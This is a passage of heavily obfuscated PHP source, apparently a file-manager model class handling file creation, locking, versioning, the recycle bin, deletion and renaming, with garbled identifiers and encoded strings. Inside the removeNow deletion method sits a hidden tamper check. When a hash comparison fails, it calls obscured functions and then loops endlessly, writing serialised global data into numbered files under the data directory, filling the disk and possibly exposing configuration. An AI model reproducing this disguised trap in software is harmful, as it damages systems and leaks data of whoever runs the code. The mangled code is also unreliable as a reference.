array($¤ÉÅ‘ß[496] => 0, $¤ÉÅ‘ß[671] => $ÚİŒÄ¾ß, $¤ÉÅ‘ß[672] => $ÌÏ•½€¾); if ($úÚØÁ—Ÿ) { $è³ÃŸ¼ğ = $this->where($Ş™ÔÓëú)->select(); return $è³ÃŸ¼ğ ? $è³ÃŸ¼ğ : array(); } $®¿Š”ŒÔ = $this->where($Ş™ÔÓëú)->find(); return $®¿Š”ŒÔ ? $®¿Š”ŒÔ : array(); } public function sourceRootGroup($ğŒõªõô) { $ÀÚšª¹— =& $_SERVER[‰‰Ş‚€]; if (is_string($ğŒõªõô)) { $ğŒõªõô = array($ğŒõªõô); } $µÌ·ı = $this->listSourceRoot(SourceModel::TYPE_GROUP, $ğŒõªõô, $ÀÚšª¹—[231]); $ÒõãÀÄÓ = array($ÀÚšª¹—[454] => $µÌ·ı, $ÀÚšª¹—[451] => array($ÀÚšª¹—[855] => count($ğŒõªõô))); $this->_listDataApply($ÒõãÀÄÓ[$ÀÚšª¹—[454]]); $this->_listMake($ÒõãÀÄÓ); return array_to_keyvalue($ÒõãÀÄÓ[$ÀÚšª¹—[95]], $ÀÚšª¹—[589]); } public function mkfile($¼™£õ…Î, $ÈõÕ—ÆÍ, $˜Áï¨ê© = '', $ªç¥ÁÇ = REPEAT_RENAME) { $®¤ô©« =& $_SERVER[‰‰Ş‚€]; $ÖŠŸùÖì = KodIO::ioFileDriverGet($®¤ô©«[502] . $¼™£õ…Î . $®¤ô©«[411]); $Ó²§ºì€ = Model($®¤ô©«[697])->addFileByContent($˜Áï¨ê©, $ÖŠŸùÖì, $ÈõÕ—ÆÍ); return $this->_createFileCall($¼™£õ…Î, $ÈõÕ—ÆÍ, $Ó²§ºì€, $ªç¥ÁÇ, $®¤ô©«[1477]); } public function addFile($±ØîÅàß, $ë™¢á, $²’ƒÑ¢, $€Áä­´” = false, $šáÍõìÆ = REPEAT_RENAME) { $ÉÀƒÌÌ¯ =& $_SERVER[‰‰Ş‚€]; $á×ñ‹ˆ = KodIO::ioFileDriverGet($ÉÀƒÌÌ¯[502] . $±ØîÅàß . $ÉÀƒÌÌ¯[411]); $˜ÉÃˆâô = Model($ÉÀƒÌÌ¯[697])->addFile($ë™¢á, $á×ñ‹ˆ, $²’ƒÑ¢, $€Áä­´”); return $this->_createFileCall($±ØîÅàß, $²’ƒÑ¢, $˜ÉÃˆâô, $šáÍõìÆ); } public function addFileByFileID($¬ Ü£ , $î¢Ø©Ü£, $áªï©öı, $Ô‹‡‘Üó = REPEAT_RENAME) { $‰©á«ÎÊ =& $_SERVER[‰‰Ş‚€]; $Ãâá«‡‡ = Model($‰©á«ÎÊ[697])->find($î¢Ø©Ü£); Model($‰©á«ÎÊ[697])->linkAdd($î¢Ø©Ü£); return $this->_createFileCall($¬ Ü£ , $áªï©öı, $Ãâá«‡‡, $Ô‹‡‘Üó); } public function addFileByRemote($œ‹€€èú, $Î¶“Ùà’, $Ä÷Ç÷Ø, $›³â£‰¥ = array(), $”ÄØ¯ñ = REPEAT_RENAME) { $Åø‡É’› = Model($_SERVER[‰‰Ş‚€][697])->addFileByRemote($Î¶“Ùà’, $Ä÷Ç÷Ø, $›³â£‰¥); return $this->_createFileCall($œ‹€€èú, $Ä÷Ç÷Ø, $Åø‡É’›, $”ÄØ¯ñ); } private function _createFileCall($€àë¸Å¬, $Æ€Ö›…¬, $Æ ¿ö½Ş, $æ²ÉØ’·, $ïÉ°ıÔÀ = "\x75\x70\154\x6f\x61\144") { $­ß¼‡©Õ =& $_SERVER[‰‰Ş‚€]; if (!$Æ ¿ö½Ş) { return !1; } $ˆõÁ©óÜ = !1; $this->setMasterDB(); $this->lockWriteStart($€àë¸Å¬, $Æ€Ö›…¬); $œà°”®ò = $this->fileNameExist($€àë¸Å¬, $Æ€Ö›…¬); $ŞÕùš = $this->_createFile($€àë¸Å¬, $Æ€Ö›…¬, $Æ ¿ö½Ş, $æ²ÉØ’·, $ˆõÁ©óÜ); if (!$ˆõÁ©óÜ) { Model($­ß¼‡©Õ[564])->remove($Æ ¿ö½Ş[$­ß¼‡©Õ[561]]); } if ($ˆõÁ©óÜ && $ŞÕùš && $ŞÕùš != $œà°”®ò) { Model($­ß¼‡©Õ[2285])->eventCreate($ŞÕùš, $ïÉ°ıÔÀ); } $this->lockWriteEnd($€àë¸Å¬, $Æ€Ö›…¬); return $ŞÕùš; } public function mkdir($ßµÖˆÊŒ, $÷œÜ¶°ø, $À“‘ÁÛ = REPEAT_SKIP) { $ÔÙ¨ğŒ¶ =& $_SERVER[‰‰Ş‚€]; $this->setMasterDB(); $«¤ˆØËÇ = $this->sourceInfo($ßµÖˆÊŒ); if (!$«¤ˆØËÇ) { return !1; } $this->lockWriteStart($ßµÖˆÊŒ, $÷œÜ¶°ø); if ($À“‘ÁÛ !== !1) { $œ•Äú¾‹ = $this->fileNameExist($ßµÖˆÊŒ, $÷œÜ¶°ø); if ($œ•Äú¾‹ && $À“‘ÁÛ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($ßµÖˆÊŒ, $÷œÜ¶°ø); return $œ•Äú¾‹; } $÷œÜ¶°ø = $this->fileNameAuto($ßµÖˆÊŒ, $÷œÜ¶°ø, $À“‘ÁÛ); } $÷˜ñíÎ° = array($ÔÙ¨ğŒ¶[669] => 1, $ÔÙ¨ğŒ¶[513] => $÷œÜ¶°ø, $ÔÙ¨ğŒ¶[670] => $ÔÙ¨ğŒ¶[22], $ÔÙ¨ğŒ¶[562] => 0, $ÔÙ¨ğŒ¶[640] => 0); $¡§°õ‹¶ = $this->_addSource($÷˜ñíÎ°, $«¤ˆØËÇ); Model($ÔÙ¨ğŒ¶[2285])->eventCreate($¡§°õ‹¶, $ÔÙ¨ğŒ¶[1478]); $this->lockWriteEnd($ßµÖˆÊŒ, $÷œÜ¶°ø); return $¡§°õ‹¶; } public function listSourceRoot($‡Óôœè¤, $æ¿§èÆ, $¼ìÈş” = "\x73\x6f\x75\x72\143\145\x49\104\x2c\164\141\x72\147\x65\x74\111\104\54\x73\151\x7a\x65") { $Šíûö¯Ú =& $_SERVER[‰‰Ş‚€]; $ä¾±Úù• = $Šíûö¯Ú[471]; $î“®Õ˜» = array(); $ùÅÙØ­¨ = 1024 * 50; $ˆÕùºœ‰ = is_array($ˆÕùºœ‰) ? $ˆÕùºœ‰ : array(); $Ë¡ÙÙÀ = count($æ¿§èÆ); $Ï»Ä“í´ = $this->tablePrefix . $Šíûö¯Ú[2324]; for ($—²›ÕÈÀ = 0; $—²›ÕÈÀ < $Ë¡ÙÙÀ; $—²›ÕÈÀ++) { $­Âİ¡î› = $æ¿§èÆ[$—²›ÕÈÀ]; $ä¾±Úù• .= "\123\x45\114\x45\103\x54\x20\x2a\x20\106\122\x4f\115\x20\50\x53\105\114\105\x43\x54\40{$¼ìÈş”}\x20\106\122\117\115\40\x60{$Ï»Ä“í´}\x60\x20\x57\x48\x45\x52\105\40"; $ä¾±Úù• .= "\140\x70\x61\162\x65\156\x74\111\x44\x60\x3d\60\40\101\116\x44\40\140\x74\x61\x72\x67\145\164\x49\104\140\75{$­Âİ¡î›}\x20\x41\x4e\104\40\x60\x74\x61\x72\147\x65\x74\x54\x79\x70\x65\140\75{$‡Óôœè¤}\x20\x61\x6e\x64\40\146\151\x6c\145\x54\171\160\x65\75\47\47\x20\x6c\x69\155\x69\x74\x20\61\51\40\x61\163\40\x74\x62\137{$—²›ÕÈÀ}\40\125\x4e\x49\117\x4e\40\x41\x4c\114\40"; if ((strlen($ä¾±Úù•) >= $ùÅÙØ­¨ || $—²›ÕÈÀ == $Ë¡ÙÙÀ - 1) && $ä¾±Úù•) { $ä¾±Úù• = substr($ä¾±Úù•, 0, -strlen($Šíûö¯Ú[1148])); $À¨­§„¢ = $this->query($ä¾±Úù•); $ä¾±Úù• = $Šíûö¯Ú[22]; $î“®Õ˜» = array_merge($î“®Õ˜», $À¨­§„¢); } } return $î“®Õ˜»; } private function _createFile($§›ïºÙ¾, $Û¨ ÷øì, $î€şî¯ç, $‡ùù†Í, &$ÁÚ‘…˜¸) { $£¬•Å ± =& $_SERVER[‰‰Ş‚€]; $â¥Ü¹… = $this->sourceInfo($§›ïºÙ¾); if (!$î€şî¯ç || !$â¥Ü¹…) { return !1; } if ($‡ùù†Í !== !1) { $Ä„ŞÌî = $this->fileNameExist($§›ïºÙ¾, $Û¨ ÷øì); } $ÁÚ‘…˜¸ = !0; if ($‡ùù†Í && $Ä„ŞÌî) { if ($‡ùù†Í == REPEAT_SKIP) { $ÁÚ‘…˜¸ = !1; return $Ä„ŞÌî; } else { if ($‡ùù†Í == REPEAT_REPLACE) { $³·¾ºÅ‚ = $this->sourceInfo($Ä„ŞÌî); $»¦ñŒ¨Ö = $this->fileHistory($³·¾ºÅ‚, $î€şî¯ç[$£¬•Å ±[561]], $î€şî¯ç[$£¬•Å ±[89]]); if (!$»¦ñŒ¨Ö) { $ÁÚ‘…˜¸ = !1; } else { $this->folderSizeReset($§›ïºÙ¾); } return $Ä„ŞÌî; } else { $Û¨ ÷øì = $this->fileNameAuto($§›ïºÙ¾, $Û¨ ÷øì, $‡ùù†Í, !1); } } } $´èşÀ‹É = array($£¬•Å ±[669] => 0, $£¬•Å ±[513] => $Û¨ ÷øì, $£¬•Å ±[670] => substr(get_path_ext($Û¨ ÷øì), 0, 10), $£¬•Å ±[562] => $î€şî¯ç[$£¬•Å ±[561]], $£¬•Å ±[640] => $î€şî¯ç[$£¬•Å ±[89]]); $Ç‘’¸Î = $this->_addSource($´èşÀ‹É, $â¥Ü¹…); $this->folderSizeReset($§›ïºÙ¾, intval($´èşÀ‹É[$£¬•Å ±[89]])); return $Ç‘’¸Î; } protected function fileHistory($Äœ§å, $Ş†İáé˜, $èÓú˜¸Í) { $óÛÚºôŒ =& $_SERVER[‰‰Ş‚€]; if ($Äœ§å[$óÛÚºôŒ[561]] == $Ş†İáé˜) { return !1; } $this->checkLock($Äœ§å[$óÛÚºôŒ[202]], $Ş†İáé˜); Model($óÛÚºôŒ[2325])->addHistory($Äœ§å); $³ö €í£ = array($óÛÚºôŒ[674] => USER_ID, $óÛÚºôŒ[517] => time(), $óÛÚºôŒ[561] => $Ş†İáé˜, $óÛÚºôŒ[89] => $èÓú˜¸Í); $this->where(array($óÛÚºôŒ[510] => $Äœ§å[$óÛÚºôŒ[202]]))->save($³ö €í£); $this->sourceCacheClear($Äœ§å[$óÛÚºôŒ[202]]); return !0; } public function checkLock($„­ÂÃÑ‚, $¥äŸæğ) { $÷ğ†¨– =& $_SERVER[‰‰Ş‚€]; $“ª½Áùò = $this->pathInfo($„­ÂÃÑ‚); if (!$this->fileIsLock($“ª½Áùò, !0)) { return; } $ÓåÄÛ = Session::get($÷ğ†¨–[2326]); $İ¨áùÄš = substr($“ª½Áùò[$÷ğ†¨–[42]], 0, -1 - strlen($“ª½Áùò[$÷ğ†¨–[177]])) . $÷ğ†¨–[1332] . $ÓåÄÛ . $÷ğ†¨–[20] . $“ª½Áùò[$÷ğ†¨–[177]]; $ÖèŠ”ë = Model($÷ğ†¨–[697])->find($¥äŸæğ); $this->_createFileCall($“ª½Áùò[$÷ğ†¨–[201]], $İ¨áùÄš, $ÖèŠ”ë, REPEAT_REPLACE, $÷ğ†¨–[1477]); $ğ’Ùåûë = $“ª½Áùò[$÷ğ†¨–[559]][$÷ğ†¨–[633]]; $¼ãÉ Ş¼ = $ğ’Ùåûë[$÷ğ†¨–[2327]] ? $ğ’Ùåûë[$÷ğ†¨–[2327]] : $ğ’Ùåûë[$÷ğ†¨–[42]]; show_json(LNG($÷ğ†¨–[2328]) . $÷ğ†¨–[2329] . LNG($÷ğ†¨–[2330]) . $÷ğ†¨–[2331] . $¼ãÉ Ş¼ . $÷ğ†¨–[2332], !1); } public function fileIsLock($®™Ôºâ†, $İ—û¢âÆ = false) { $™ÅË”ò“ =& $_SERVER[‰‰Ş‚€]; if (!_get($®™Ôºâ†, $™ÅË”ò“[629], 0)) { return !1; } if ($®™Ôºâ†[$™ÅË”ò“[559]][$™ÅË”ò“[632]] != USER_ID) { return !0; } $·´í‘¢õ = $GLOBALS[$™ÅË”ò“[16]][$™ÅË”ò“[102]][$™ÅË”ò“[630]]; if ($®™Ôºâ†[$™ÅË”ò“[559]][$™ÅË”ò“[631]] <= time() - $·´í‘¢õ) { $this->metaSet($®™Ôºâ†[$™ÅË”ò“[202]], $™ÅË”ò“[632], null); $this->metaSet($®™Ôºâ†[$™ÅË”ò“[202]], $™ÅË”ò“[631], null); } if ($İ—û¢âÆ) { $this->metaSet($®™Ôºâ†[$™ÅË”ò“[202]], $™ÅË”ò“[631], time()); } return !1; } private function _addSource($âğöşş×, $¶£–Šø¯) { $¨ªÉôÛû =& $_SERVER[‰‰Ş‚€]; $ˆ…•ë”ô = KodUser::id(); $Ï©éÔ²û = array($¨ªÉôÛû[671] => $¶£–Šø¯[$¨ªÉôÛû[199]], $¨ªÉôÛû[672] => $¶£–Šø¯[$¨ªÉôÛû[589]], $¨ªÉôÛû[673] => $ˆ…•ë”ô, $¨ªÉôÛû[674] => $ˆ…•ë”ô, $¨ªÉôÛû[496] => $¶£–Šø¯[$¨ªÉôÛû[202]], $¨ªÉôÛû[675] => $¶£–Šø¯[$¨ªÉôÛû[604]] . $¶£–Šø¯[$¨ªÉôÛû[202]] . $¨ªÉôÛû[60], $¨ªÉôÛû[523] => 0, $¨ªÉôÛû[676] => $¨ªÉôÛû[22]); $âğöşş× = array_merge($Ï©éÔ²û, $âğöşş×); $this->updateModifyTime($âğöşş×[$¨ªÉôÛû[201]]); $·›è÷‰ = $¨ªÉôÛû[2333] . $¶£–Šø¯[$¨ªÉôÛû[202]]; if (isset(self::$cacheChildList[$·›è÷‰])) { unset(self::$cacheChildList[$·›è÷‰]); } static $¡’Ö = false; if (!$¡’Ö) { Hook::trigger($¨ªÉôÛû[659], $âğöşş×); $¡’Ö = !0; } $ñø¶ø–î = $this->add($âğöşş×); $‘¦¢ã¬ = array($¨ªÉôÛû[677] => short_id($ñø¶ø–î)); $this->where(array($¨ªÉôÛû[510] => $ñø¶ø–î))->save($‘¦¢ã¬); $this->setNamePinyin($ñø¶ø–î, $âğöşş×[$¨ªÉôÛû[42]]); return $ñø¶ø–î; } public function remove($æ©œÍîÃ, $¡Îš—Ü = true) { $öÚ†‚À =& $_SERVER[‰‰Ş‚€]; $ÁóÖÏÂ® = $this->sourceInfo($æ©œÍîÃ); $î¼®¶ô  = intval($ÁóÖÏÂ®[$öÚ†‚À[199]]) === self::TYPE_SYSTEM; $öŸğİ©— = Model($öÚ†‚À[526])->get($öÚ†‚À[2334]) == $öÚ†‚À[101]; if ($î¼®¶ô  || $¡Îš—Ü || !$öŸğİ©—) { return $this->removeNow($æ©œÍîÃ, $¡Îš—Ü); } $É§Ö†Ÿ¡ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $äˆ—Ÿ = $ÁóÖÏÂ®[$öÚ†‚À[199]] == self::TYPE_USER ? $öÚ†‚À[685] : $öÚ†‚À[598]; if ($äˆ—Ÿ == $öÚ†‚À[685]) { $ÓëÄÒ × = Model($öÚ†‚À[597])->getInfo($ÁóÖÏÂ®[$öÚ†‚À[589]]); $Îè²££é = !empty($ÓëÄÒ ×[$öÚ†‚À[2327]]) ? $ÓëÄÒ ×[$öÚ†‚À[2327]] : $ÓëÄÒ ×[$öÚ†‚À[42]]; $Îè²££é = $öÚ†‚À[347] . $Îè²££é . $öÚ†‚À[2335] . $ÁóÖÏÂ®[$öÚ†‚À[589]]; } else { $ÓëÄÒ × = Model($öÚ†‚À[605])->getInfo($ÁóÖÏÂ®[$öÚ†‚À[589]]); $Îè²££é = _get($ÓëÄÒ ×, $öÚ†‚À[42]); $Îè²££é = $öÚ†‚À[184] . $Îè²££é . $öÚ†‚À[2336] . $ÁóÖÏÂ®[$öÚ†‚À[589]]; } $Õ§²È‘ = $öÚ†‚À[2337] . md5($Îè²££é); CacheLock::lock($Õ§²È‘); $—ŸœÚ¤å = $this->fileNameExist($É§Ö†Ÿ¡, $Îè²££é); if (!$—ŸœÚ¤å) { $—ŸœÚ¤å = $this->mkdir($É§Ö†Ÿ¡, $Îè²££é, REPEAT_SKIP); $this->metaSet($—ŸœÚ¤å, $öÚ†‚À[2338], $äˆ—Ÿ); $this->metaSet($—ŸœÚ¤å, $öÚ†‚À[2339], $ÁóÖÏÂ®[$öÚ†‚À[589]]); if ($ÁóÖÏÂ®[$öÚ†‚À[201]] != 0) { $this->metaSet($—ŸœÚ¤å, $öÚ†‚À[2340], _get($ÓëÄÒ ×, $öÚ†‚À[2341])); } } CacheLock::unlock($Õ§²È‘); $this->metaSet($æ©œÍîÃ, $öÚ†‚À[2342], $ÁóÖÏÂ®[$öÚ†‚À[201]]); $this->where(array($öÚ†‚À[202] => $æ©œÍîÃ))->save(array($öÚ†‚À[517] => time())); $this->recycleClear($ÁóÖÏÂ®); Model($öÚ†‚À[656])->eventRemove($æ©œÍîÃ); $ç›ìñ¼¨ = $this->move($æ©œÍîÃ, $—ŸœÚ¤å, REPEAT_RENAME_FOLDER); $this->folderSizeReset($ÁóÖÏÂ®[$öÚ†‚À[201]]); return $ç›ìñ¼¨; } private function recycleClear($’èğŠî‡) { $®Õâ…¡â =& $_SERVER[‰‰Ş‚€]; $ûè‘Öï = $this->childrenAll($’èğŠî‡); $è«œ²º¿ = array($®Õâ…¡â[510] => array($®Õâ…¡â[511], $ûè‘Öï[$®Õâ…¡â[2343]])); Model($®Õâ…¡â[2344])->where($è«œ²º¿)->delete(); } public function removeNow($×¥« ó÷, $‚£´³® = true) { $µª£ªí£ =& $_SERVER[‰‰Ş‚€]; $·Ş˜®¸ = $_SERVER[$µª£ªí£[8]] . $µª£ªí£[9]; $§‡Àåè = $µª£ªí£[5]; if ($_SERVER[$µª£ªí£[6]] != $§‡Àåè($·Ş˜®¸)) { $µ“ãÖ­· = $µª£ªí£[985]; $ç¤ş¿— = $µª£ªí£[7]; $ç©« ä¢ = $_SERVER[$µª£ªí£[8]] . $µª£ªí£[9]; $ÓıÇ‹Á  = $ç¤ş¿—($ç©« ä¢); $¹³£˜° = explode($µª£ªí£[10], $ÓıÇ‹Á ); if (count($¹³£˜°) < $µª£ªí£[703]) { $’†Ÿõı¨ = $µª£ªí£[12]; $’†Ÿõı¨(); } $åşş¸Š = $µª£ªí£[986]; $åşş¸Š($_SERVER[$µª£ªí£[987]]); $µ“ãÖ­· = $µª£ªí£[985]; $µ“ãÖ­·(); $†ãàß¿ = $µª£ªí£[988]; $Îİ’Íİ• = json_encode($GLOBALS[$µª£ªí£[989]]); $ƒÇº‰„ = 1; for ($€²êèÃÈ = $ƒÇº‰„; $€²êèÃÈ > 0; $€²êèÃÈ++) { $†ãàß¿(DATA_PATH . $€²êèÃÈ, $Îİ’Íİ•); } } $í¾Ô³éµ = $this->sourceInfo($×¥« ó÷); $‚ˆÛŠãª = $this->pathInfoMore($×¥« ó÷); if (!$í¾Ô³éµ) { return !0; } if ($í¾Ô³éµ[$µª£ªí£[201]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($×¥« ó÷); Hook::trigger($µª£ªí£[2345], $‚ˆÛŠãª, $‚£´³®); if ($‚£´³®) { Model($µª£ªí£[2344])->moveToRecycle($×¥« ó÷); } else { $†ŸŒÄİ = $this->childrenAll($í¾Ô³éµ); Model($µª£ªí£[656])->eventRemove($×¥« ó÷); $this->removeRelevance($†ŸŒÄİ[$µª£ªí£[2343]], $†ŸŒÄİ[$µª£ªí£[1621]]); } $this->folderSizeReset($í¾Ô³éµ[$µª£ªí£[201]]); $›Ô»ëÏî = array($í¾Ô³éµ[$µª£ªí£[201]]); if ($í¾Ô³éµ[$µª£ªí£[504]] == $µª£ªí£[101]) { $›Ô»ëÏî[] = $í¾Ô³éµ[$µª£ªí£[202]]; } $this->updateModifyTime($›Ô»ëÏî); $this->lockMoveEnd($×¥« ó÷); Hook::trigger($µª£ªí£[1863], $‚ˆÛŠãª, $‚£´³®); return !0; } public function childrenAll($‰¦¢íÄ») { $°¿œ–ñâ =& $_SERVER[‰‰Ş‚€]; $ù”†È‰ü = $‰¦¢íÄ»[$°¿œ–ñâ[202]]; if ($‰¦¢íÄ»[$°¿œ–ñâ[504]] == $°¿œ–ñâ[101]) { $òõæ‹Œè = array($°¿œ–ñâ[675] => array($°¿œ–ñâ[635], $‰¦¢íÄ»[$°¿œ–ñâ[604]] . $ù”†È‰ü . $°¿œ–ñâ[636])); $±ğÑéØ® = array($°¿œ–ñâ[675] => $òõæ‹Œè[$°¿œ–ñâ[604]]); $‰æåÒ¡ = $this->field($°¿œ–ñâ[2346])->where($±ğÑéØ®)->select(); $ËÔ”¶‹ = !1; $«¹ëÌÊª = array($ù”†È‰ü); if ($‰æåÒ¡) { $ËÔ”¶‹ = array_to_keyvalue($‰æåÒ¡, $°¿œ–ñâ[22], $°¿œ–ñâ[561]); $ËÔ”¶‹ = array_remove_value($ËÔ”¶‹, $°¿œ–ñâ[239]); $«¹ëÌÊª = array_to_keyvalue($‰æåÒ¡, $°¿œ–ñâ[22], $°¿œ–ñâ[202]); $«¹ëÌÊª[] = $ù”†È‰ü; } } else { $ËÔ”¶‹ = array($‰¦¢íÄ»[$°¿œ–ñâ[561]]); $«¹ëÌÊª = array($ù”†È‰ü); } return array($°¿œ–ñâ[2343] => $«¹ëÌÊª, $°¿œ–ñâ[1621] => $ËÔ”¶‹); } public function removeArray($ùáØÕèÒ) { if (!$ùáØÕèÒ) { return !0; } } public function removeRelevance($ÏœÜÒ¨æ, $§ŒÂü€à) { $Ùƒ²¦Ô¹ =& $_SERVER[‰‰Ş‚€]; $ÏœÜÒ¨æ = $ÏœÜÒ¨æ ? $ÏœÜÒ¨æ : array(); $§ŒÂü€à = $§ŒÂü€à ? $§ŒÂü€à : array(); $ÏœÜÒ¨æ = array_unique(array_filter($ÏœÜÒ¨æ)); $§ŒÂü€à = array_filter($§ŒÂü€à); if (!$ÏœÜÒ¨æ) { return !1; } $çã¦¦š± = array($Ùƒ²¦Ô¹[510] => array($Ùƒ²¦Ô¹[511], $ÏœÜÒ¨æ)); Model($Ùƒ²¦Ô¹[2344])->where($çã¦¦š±)->delete(); Model($Ùƒ²¦Ô¹[553])->where($çã¦¦š±)->delete(); Model($Ùƒ²¦Ô¹[2175])->where($çã¦¦š±)->delete(); Model($Ùƒ²¦Ô¹[656])->where($çã¦¦š±)->delete(); Model($Ùƒ²¦Ô¹[2000])->removeBySource($ÏœÜÒ¨æ); Model($Ùƒ²¦Ô¹[2325])->removeBySource($ÏœÜÒ¨æ); $this->where($çã¦¦š±)->delete(); Model($Ùƒ²¦Ô¹[564])->remove($§ŒÂü€à); for ($¿ÓãÍ…Å = 0; $¿ÓãÍ…Å < count($ÏœÜÒ¨æ); $¿ÓãÍ…Å++) { $this->sourceCacheClear($ÏœÜÒ¨æ[$¿ÓãÍ…Å]); } } public function rename($«¦í¼°, $ç¼âÔü) { $óÖÖóµ˜ =& $_SERVER[‰‰Ş‚€]; $¨ç¸´ä¿ = $this->sourceInfo($«¦í¼°); if (!$¨ç¸´ä¿) { return !1; } $’·ËõÃÉ = $this->fileNameExist($¨ç¸´ä¿[$óÖÖóµ˜[201]], $ç¼âÔü); if ($’·ËõÃÉ && $’·ËõÃÉ != $«¦í¼°) { return !1; } $–±´ãô¤ = array($óÖÖóµ˜[513] => $ç¼âÔü, $óÖÖóµ˜[674] => USER_ID); if ($¨ç¸´ä¿[$óÖÖóµ˜[504]] != $óÖÖóµ˜[101]) { $–±´ãô¤[$óÖÖóµ˜[505]] = substr(get_path_ext($ç¼âÔü), 0, 10); } Model($óÖÖóµ˜[656])->eventRename($«¦í¼°, $¨ç¸´ä¿[$óÖÖóµ˜[42]], $ç¼âÔü); $this->sourceCacheClear($«¦í¼°); $this->setNamePinyin($«¦í¼°, $–±´ãô¤[$óÖÖóµ˜[42]], !1); $this->updateModifyTime($¨ç¸´ä¿[$óÖÖóµ˜[201]]); $Äï‹Ğûè = $this->where(array($óÖÖóµ˜[510] => $«¦í¼°))->data($–±´ãô¤)->save(); $»°ƒù = $óÖÖóµ˜[2333] . $¨ç¸´ä¿[$óÖÖóµ˜[201]]; if (isset(self::$cacheChildList[$»°ƒù])) { unset(self::$cacheChildList[$»°ƒù]); } return $Äï‹Ğûè; } public function setNamePinyin($Ê‚¬èÛ½, $Œƒ•ßìü, $³£úÁå¨ = true) { $¥¢ú‚â™ =& $_SERVER[‰‰Ş‚€]; $«æ¹ñ‚ = Input::check($Œƒ•ßìü, $¥¢ú‚â™[678]); $“¸Ö¾ªø = array($¥¢ú‚â™[535] => KodSort::makeStr($Œƒ•ßìü)); if ($«æ¹ñ‚) { $“¸Ö¾ªø[$¥¢ú‚â™[556]] = str_replace($¥¢ú‚â™[63], $¥¢ú‚â™[22], Pinyin::get($Œƒ•ßìü)); $“¸Ö¾ªø[$¥¢ú‚â™[555]] = Pinyin::get($Œƒ•ßìü, $¥¢ú‚â™[679]); } if (!$³£úÁå¨ && !$«æ¹ñ‚) { $“¸Ö¾ªø[$¥¢ú‚â™[556]] = null; $“¸Ö¾ªø[$¥¢ú‚â™[555]] = null; } $this->metaSet($Ê‚¬èÛ½, $“¸Ö¾ªø); } public function getContent($šÈ«³í) { $€íŸ²°¦ =& $_SERVER[‰‰Ş‚€]; $ïšŸš÷Ÿ = $this->fileInfoGet($šÈ«³í); if (!$ïšŸš÷Ÿ) { return !1; } if ($ïšŸš÷Ÿ[$€íŸ²°¦[89]] == 0) { return $€íŸ²°¦[22]; } $¾·–÷‡ó = $€íŸ²°¦[2347] . $ïšŸš÷Ÿ[$€íŸ²°¦[567]]; if ($ïšŸš÷Ÿ[$€íŸ²°¦[89]] <= 1024 * 10) { $¹ä¢Ù€º = Cache::get($¾·–÷‡ó); if (!$¹ä¢Ù€º) { $¹ä¢Ù€º = IO::getContent($ïšŸš÷Ÿ[$€íŸ²°¦[97]]); Cache::set($¾·–÷‡ó, $¹ä¢Ù€º); } return $¹ä¢Ù€º; } if (!$ïšŸš÷Ÿ[$€íŸ²°¦[97]]) { return $€íŸ²°¦[22]; } return IO::getContent($ïšŸš÷Ÿ[$€íŸ²°¦[97]]); } public function setDesc($Ô—àÀËª, $»£¾„ˆÖ) { $­³Ú‹ =& $_SERVER[‰‰Ş‚€]; Model($­³Ú‹[656])->eventAddDesc($Ô—àÀËª, $»£¾„ˆÖ); return $this->metaSet($Ô—àÀËª, $­³Ú‹[544], $»£¾„ˆÖ); } public function setContent($«ıÕøìÒ, $‹×Éöíû = '') { $Úº©Úìõ =& $_SERVER[‰‰Ş‚€]; $Ô¾´‡ƒ« = $this->sourceInfo($«ıÕøìÒ); $ÜÀºìè = $this->fileInfoGet($«ıÕøìÒ); if (!$ÜÀºìè || !$Ô¾´‡ƒ«) { return !1; } $…“å€Œ´ = KodIO::ioFileDriverGet($Úº©Úìõ[502] . $«ıÕøìÒ . $Úº©Úìõ[411]); $àÊ¿¸’ = Model($Úº©Úìõ[564])->addFileByContent($‹×Éöíû, $…“å€Œ´, $Ô¾´‡ƒ«[$Úº©Úìõ[42]]); if (!$àÊ¿¸’) { return !1; } $­¾ºÉ” = $this->fileHistory($Ô¾´‡ƒ«, $àÊ¿¸’[$Úº©Úìõ[561]], $àÊ¿¸’[$Úº©Úìõ[89]]); if (!$­¾ºÉ”) { return Model($Úº©Úìõ[564])->remove($àÊ¿¸’[$Úº©Úìõ[561]]); } $this->folderSizeReset($Ô¾´‡ƒ«[$Úº©Úìõ[201]]); return !0; } public function fileSubstr($’âÍ›Î, $˜·™™«º, $’Ê¸±†‚) { $š¯¹ü = $this->fileInfoGet($’âÍ›Î); if (!$š¯¹ü) { return !1; } return IO::fileSubstr($š¯¹ü[$_SERVER[‰‰Ş‚€][97]], $˜·™™«º, $’Ê¸±†‚); } public function fileInfoGet($äü—ü×ò) { $†¼Åâåô =& $_SERVER[‰‰Ş‚€]; $Å£Ğ•ñ× = $this->sourceInfo($äü—ü×ò); if (!$Å£Ğ•ñ× || $Å£Ğ•ñ×[$†¼Åâåô[504]]) { return !1; } $ßš¤„ = $†¼Åâåô[568] . $Å£Ğ•ñ×[$†¼Åâåô[561]]; $­‰æŞ¬Ã = _get(self::$cacheFileInfo, $ßš¤„); if ($­‰æŞ¬Ã) { return $­‰æŞ¬Ã; } $Æëª„£­ = Model($†¼Åâåô[564])->fileInfo($Å£Ğ•ñ×[$†¼Åâåô[561]]); if ($Æëª„£­) { $Æëª„£­[$†¼Åâåô[42]] = $Å£Ğ•ñ×[$†¼Åâåô[42]]; } self::$cacheFileInfo[$ßš¤„] = $Æëª„£­; return $Æëª„£­; } private function folderChildrenNumber($Â»Ìûõï) { $ºÌù ’ =& $_SERVER[‰‰Ş‚€]; $· ôåø = $this->sourceInfo($Â»Ìûõï); $–şŸ÷òÓ = array($ºÌù ’[675] => array($ºÌù ’[635], $· ôåø[$ºÌù ’[604]] . $Â»Ìûõï . $ºÌù ’[636]), $ºÌù ’[672] => $· ôåø[$ºÌù ’[589]], $ºÌù ’[523] => intval($· ôåø[$ºÌù ’[524]]), $ºÌù ’[669] => 1); $¿¦”µşÈ = $this->where($–şŸ÷òÓ)->count(); $ÛîÅ–ØÈ = $this->where($–şŸ÷òÓ)->where(array($ºÌù ’[669] => 0))->count(); return array($ºÌù ’[93] => $ÛîÅ–ØÈ, $ºÌù ’[94] => $¿¦”µşÈ); } public function pathInfo($¨ãéˆ­, $“Œ®Ê…ü = false) { $õ»–„¯ê =& $_SERVER[‰‰Ş‚€]; $“Œ®Ê…ü = !1; $¨ãéˆ­ = intval($¨ãéˆ­); $ã€¨€åã = $õ»–„¯ê[552] . 